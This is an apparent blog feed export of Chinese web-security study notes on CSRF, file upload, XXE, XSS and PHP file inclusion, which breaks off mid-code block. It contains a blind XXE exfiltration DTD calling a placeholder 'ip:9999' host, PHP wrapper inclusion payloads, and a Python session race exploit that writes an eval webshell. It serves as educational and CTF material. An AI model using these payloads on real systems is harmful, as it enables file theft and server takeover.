            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF-知识点</title>
      <link href="/2022/04/23/CSRF-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/23/CSRF-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的 情况下执行在权限保护之下的操作，具有很大的危害性</p><span id="more"></span><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当受害者当前会话未过期，此时攻击者伪造一个请求，诱导受害者点击从而达到发消息等具有危害性的操作</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>比如某网站用户信息修改功能，没有验证Referer也没添加Token，攻击者可以用HTML构造恶意代码提交POST请求，诱骗已经登陆的受害者点击，可以直接修改用户信息</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>通过CSRF-token或者验证码来检测用户提交</li><li>验证 Referer&#x2F;Content-Type</li><li>对于用户修改删除等操作最好都使用POST操作</li><li>避免全站通用的Cookie，严格设置Cookie的域</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-知识点</title>
      <link href="/2022/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="上传漏洞存在的必要条件"><a href="#上传漏洞存在的必要条件" class="headerlink" title="上传漏洞存在的必要条件"></a>上传漏洞存在的必要条件</h3><ul><li>存在上传点</li><li>可以上传动态文件</li><li>上传目录有执行权限，并且上传的文件可执行</li><li>可访问到上传的动态文件</li></ul><h3 id="常见检验方法："><a href="#常见检验方法：" class="headerlink" title="常见检验方法："></a>常见检验方法：</h3><ul><li>文件后缀检验：黑白名单</li><li>MIME检验 文件头content-type字段校验（image&#x2F;gif）</li><li>文件头检验</li><li>完整文件结构检验</li><li>恶意文件内容检测</li></ul><h3 id="常见漏洞和绕过方式："><a href="#常见漏洞和绕过方式：" class="headerlink" title="常见漏洞和绕过方式："></a>常见漏洞和绕过方式：</h3><ul><li>IIS&#x2F;nginx +php fastcgi解析漏洞 会向上查找</li><li>ISS PUT攻击</li><li>Nginx文件名逻辑漏洞 nginx： 0.8.41~14.3&#x2F;1.5.0~1.5.7</li><li>Apache解析漏洞 1.x&#x2F;2.x 向前解析</li><li>IIS 5.0&#x2F;6.0解析漏洞：默认不解析;号后面内容</li><li>::$DATA文件流特性绕过</li><li>%00截断：php&lt;5.3.4</li><li>条件竞争</li></ul><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>使用白名单限制可以上传的文件扩展名</li><li>注意0x00截断攻击（PHP更新到最新版本）</li><li>对上传后的文件统一随机命名，不允许用户控制扩展名</li><li>上传文件的存储目录禁用执行权限</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE-知识点</title>
      <link href="/2022/04/23/XXE-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/23/XXE-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入 如果使用的php中libxml低于2.9.1，或设置了libxml_disable_entity_loader(FALSE)，就会造成XXE漏洞</p><!-- more --><h3 id="危害和方法"><a href="#危害和方法" class="headerlink" title="危害和方法"></a>危害和方法</h3><p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p><h3 id="XML相关"><a href="#XML相关" class="headerlink" title="XML相关"></a>XML相关</h3><ul><li>DTD：document type definition</li><li>实体：<ul><li>内部实体：定义方法<code>&lt;!ENTITY xxe &quot;test&quot; &gt;</code></li><li>外部实体：定义方法<code>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</code></li><li>通用实体：用 <code>&amp;实体名; </code>引用的实体，他在DTD 中定义，在 XML 文档中引用</li><li>参数实体：使用<code>% 实体名</code> 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用<br>  1.只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>  2.和通用实体一样，参数实体也可以外部引用<br>  3.定义:<code>&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</code></li></ul></li></ul><h3 id="XXE-利用"><a href="#XXE-利用" class="headerlink" title="XXE 利用"></a>XXE 利用</h3><ul><li>读取本地文件：<ul><li><p>有回显：可以使用<code>&lt;![CDATA[XXX]]&gt;</code>来包裹含特殊字符的文本防止乱码</p></li><li><p>无回显：采用发起请求的方式外带数据</p></li></ul></li></ul><p>test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>​    </p><ul><li>HTTP内网主机探测</li><li>文件上传：jar:{url}!{path}</li><li>RCE：PHP 如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</li></ul><h3 id="如何防御："><a href="#如何防御：" class="headerlink" title="如何防御："></a>如何防御：</h3><ul><li>在PHP中：libxml_disable_entity_loader(true);</li><li>在java中：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="hljs-literal">true</span>);<br><br>.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="hljs-literal">false</span>)<br><br>.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><ul><li>黑名单过滤关键词</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-知识点</title>
      <link href="/2022/04/23/XSS-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/23/XSS-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>xss相关危害,防御,原理等</p><span id="more"></span><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>攻击者可以使用户在浏览器中执行其预定义的恶意脚本，其导致的危害可想而知，如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖XSS蠕虫，甚至破坏网站、修改路由器配置信息等。</p><h3 id="常用的XSS攻击手段和目的有："><a href="#常用的XSS攻击手段和目的有：" class="headerlink" title="常用的XSS攻击手段和目的有："></a>常用的XSS攻击手段和目的有：</h3><ul><li>盗用cookie，获取敏感信息。</li><li>利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。</li><li>利用 iframe、frame、XMLHttpRequest 或 Flash 等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li><li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li><li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li><li>xss钓鱼网站，利用JavaScript脚本直接放用户跳转到钓鱼网站</li><li>xss获取键盘记录，xss可以实现键盘操作，但是有局限性，不能跨域。</li></ul><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><ul><li>反射型<br>    最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。<br>就是利用get请求，往网页的url中加入特定的参数，欺骗用户执行这个url，后端服务器接收到恶意参数后，给前端用户反应恶意数据</li><li>存储型<br>    最直接的危害类型，跨站代码存储在服务器（数据库）<br>通过使用网页的提交功能（如留言板），将代码写入到后端文件或数据库中。</li><li>DOM型<br>    客户端脚本处理逻辑导致的安全问题。<br>类似反射型，也是构造恶意url参数，但由浏览器直接执行js，可以脱离后端服务器</li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li>常用思路：大小写、双写、编码（Unicode、html实体编码、url编码等）等方法</li><li>替换其他标签，在标签内的各种事件执行js代码</li><li>http-only绕过思路：<ul><li>表单劫持：通过构造相同的表单将输入的帐号数据再发送一份给攻击者</li><li>读取浏览器保存数据：有时候浏览器会保存该站点的密码可以通过xss漏洞来执行js代码获取浏览器保存的数据发送出来</li></ul></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>httpOnly：在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。主题</li><li>输入过滤：一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。<br>不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</li><li>转义 HTML：如果拼接 HTML 是必要的，就需要对于url中的引号，尖括号，斜杠进行转义,但这还不是很完善.想对 HTML 模板各处插入点进行充分的转义,就需要采用合适的转义库。<br>例如：·htmlspecialchars()·函数把一些预定义的字符转换为 HTML 实体</li><li>白名单：对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。<br>这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含-笔记</title>
      <link href="/2022/04/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h2><ul><li>include()   ：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li>require()  ：只要程序一运行就包含文件，找不到被包含文件时会产生致命错误，并停止脚本执行</li><li>include_once()  : 若文件中代码已被包含，则不会再次被包含</li><li>require_once()  ：若文件中代码已被包含，则不会再次被包含</li></ul><h2 id="php的ini"><a href="#php的ini" class="headerlink" title="php的ini"></a>php的ini</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">On</span>（是否允许打开远程文件）<br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">On</span>（是否允许include/require远程文件）<br></code></pre></td></tr></table></figure><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>&emsp;&emsp;当访问一个不存在的资源时，Apache同样会记录下来，这就意味着，如果网站存在包含漏洞，却没有可以包含的文件时（通常指的是网页中的木马文件），就可以去访问URL：<a href="http://www.any.com/">http://www.any.com/</a><?php phpinfo();?>，虽然说网页上提示您没有访问的权限，但是Apache会记录我们的请求“<?php phpinfo();?>”，并写到access.log文件中，这时候再去包含Apache的日志文件，不就可以利用文件包含了吗？</p><p>&emsp;&emsp;但实际上是不行的，原因是访问URL后，一句话在日志文件里“变形了”，我们需要抓包 将浏览器所转的编码改回原来的字符(&lt;,&gt;还有空格都会被转义 所以需要抓包更改回来 )<br>然后中国菜刀连接日志文件就可以获取到网站webshell</p><ul><li>常用日志目录：<ul><li>&#x2F;var&#x2F;log&#x2F;</li></ul></li></ul><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul><li><p>file:&#x2F;&#x2F;</p><ul><li>php5.2以上</li><li>allow_url_fopen: off&#x2F;on</li><li>allow_url_include: off&#x2F;on</li><li>说明：file:&#x2F;&#x2F; 文件系统是 PHP使用的默认封装协议，展现了本地文件系统</li><li>用法：<ul><li>?file&#x3D;file:&#x2F;&#x2F;路径&#x2F;xx.txt</li></ul></li></ul></li><li><p>php:&#x2F;&#x2F;</p><ul><li><p>php5.2以上</p></li><li><p>allow_url_fopen: off&#x2F;on</p></li><li><p>allow_url_include: 仅php:&#x2F;&#x2F;input php:&#x2F;&#x2F;stdin php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp 需要on</p></li><li><p>作用：作用：php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)，在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p></li><li><p>分类：</p><ul><li><p>php:&#x2F;&#x2F;input<br>&emsp;可以访问请求的原始数据的只读流,在POST请求中访问POST的data部分，在<code>enctype=&quot;multipart/form-data&quot; </code>的时候php:&#x2F;&#x2F;input 是无效的。</p><ul><li>用法：php:&#x2F;&#x2F;input + [POST DATA]执行php代码</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span><br>[POST DATA部分]<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>php:&#x2F;&#x2F;output<br>&emsp;只写的数据流，允许以print和echo一样的方式写入到输出缓冲区。</p></li><li><p>php:&#x2F;&#x2F;fd<br>&emsp;(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符.例如php:&#x2F;&#x2F;fd&#x2F;3 引用了文件描述符 3。</p></li><li><p>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp<br>&emsp;(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php:&#x2F;&#x2F;memory 总是把数据储存在内存中，而 php:&#x2F;&#x2F;temp 会在内存量达到预定义的限制后（默认是2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</p></li><li><p>php:&#x2F;&#x2F;filter &emsp;(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p><ul><li><p>参数：</p><ul><li>resource&#x3D;&lt;要过滤的数据流&gt;:必须项。它指定了你要筛选过滤的数据流。</li><li>read&#x3D;&lt;读链的过滤器&gt;:可选项。可以设定一个或多个过滤器名称，以管道符（ * \ *)分隔。</li><li>write&#x3D;&lt;写链的过滤器&gt;:可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li><li>&lt;; 两个链的过滤器&gt;:任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li></ul></li><li><p>过滤器:</p><ul><li>string.rot13        等同于str_rot13()，rot13变换</li><li>string.toupper    等同于strtoupper()，转大写字母</li><li>string.tolower    等同于strtolower()，转小写字母</li><li>string.strip_tags    等同于strip_tags()，去除html、PHP语言标签</li></ul></li><li><p>转换过滤器：</p><ul><li>convert.base64-encode &amp; convert.base64-decode    等同于base64_encode()和base64_decode()，base64编码解码</li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode      quoted-printable 字符串与 8-bit 字符串编码解码</li></ul></li><li><p>用法：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]读取文件源码（针对php文件需要base64编码）</p></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=phpinfo.php<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; </p><ul><li><p>php5.2以上</p></li><li><p>allow_url_fopen: off&#x2F;on</p></li><li><p>allow_url_include: off&#x2F;on</p></li><li><p>说明：fzip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。\</p></li><li><p>用法：</p><ul><li>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）压缩 phpinfo.txt 为 phpinfo.zip，压缩包重命名为 phpinfo.jpg ，并上传</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%<span class="hljs-number">23</span>phpinfo.txt<br></code></pre></td></tr></table></figure><ul><li>compress.bzip2:&#x2F;&#x2F;file.bz2 压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">compress</span>.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<br></code></pre></td></tr></table></figure><ul><li>compress.zlib:&#x2F;&#x2F;file.gz 压缩 phpinfo.txt 为 phpinfo.gz并上传（同样支持任意后缀名）</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">compress</span>.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz<br></code></pre></td></tr></table></figure></li></ul></li><li><p>data:&#x2F;&#x2F;</p><ul><li><p>php5.2以上</p></li><li><p>allow_url_fopen: on</p></li><li><p>allow_url_include: on</p></li><li><p>说明：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p>用法：</p><ul><li>data:&#x2F;&#x2F;text&#x2F;plain, or data:text&#x2F;plain,</li></ul><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://127.0.0.1/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>data:&#x2F;&#x2F;text&#x2F;plain;base64, or data:text&#x2F;plain;base64,</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=data://<span class="hljs-keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b<br></code></pre></td></tr></table></figure></li></ul></li><li><p>http:&#x2F;&#x2F; and https:&#x2F;&#x2F;</p><ul><li>allow_url_fopen: on</li><li>allow_url_include: on</li><li>用法：</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/phpinfo.txt<br></code></pre></td></tr></table></figure></li><li><p>phar:&#x2F;&#x2F; 协议</p><ul><li>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/include.php?file=phar:/</span><span class="hljs-regexp">/E:/</span>phpStudy<span class="hljs-regexp">/PHPTutorial/</span>WWW<span class="hljs-regexp">/phpinfo.zip/</span>phpinfo.txt<br></code></pre></td></tr></table></figure></li></ul><h2 id="seesion包含-条件竞争"><a href="#seesion包含-条件竞争" class="headerlink" title="seesion包含+条件竞争"></a>seesion包含+条件竞争</h2><p>PHPSESSID必须要有，因为要竞争同一个文件<br>filename可控，但是在值的最前面加上|,因为最终目的是利用session的反序列化，PHP_SESSION_UPLOAD_PROGRESS只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突<br>上传的文件要大些，否则很难竞争成功。我写入是这么大f &#x3D; io.BytesIO(b’a’ * 1024 <em>1024</em>1)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><br>seesion_id=<span class="hljs-string">&quot;xxx&quot;</span><br>url=<span class="hljs-string">&quot;http://domain:port/&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f=io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">50</span>)<br>        res = session.post(<br>            url=url,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat ../*&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[QQQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;q.txt&#x27;</span>,f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:seesion_id&#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp=session.get(url+<span class="hljs-string">&#x27;upload/index.php&#x27;</span>) <span class="hljs-comment">#访问的链接</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=Write , args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    Read(session)<br></code></pre></td></tr></table></figure><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>当碰到后缀名写死的情况 如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <br>   <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span> . <span class="hljs-string">&quot;.txt&quot;</span>);<span class="hljs-comment">//只让我们包含txt文件</span><br>   &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="00-截断-（特定版本）"><a href="#00-截断-（特定版本）" class="headerlink" title="%00 截断 （特定版本）"></a>%00 截断 （特定版本）</h3><ul><li>条件：magic_quotes_gpc &#x3D; Off php版本&lt;5.3.4</li><li>如：<code>?name=http://127.0.0.1/ss.php%00</code></li></ul><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><ul><li><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p></li><li><p>Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></li><li><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 